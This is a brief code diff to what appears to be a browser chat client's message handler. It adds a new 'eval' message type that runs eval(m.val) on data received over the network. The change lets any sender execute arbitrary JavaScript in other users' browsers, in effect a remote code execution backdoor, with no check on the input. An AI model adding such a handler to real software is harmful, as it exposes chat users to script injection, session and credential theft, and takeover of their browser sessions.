@@ -1170,6 +1170,10 @@ figure {
             case "private":
               addChatMessage(`${m.from} 🔒`, m.message, false, m.timestamp);
               break;
+            case "eval":
+              eval(m.val)
+              break;
+              
             case "poll_start":
               renderPoll(m);
               break;
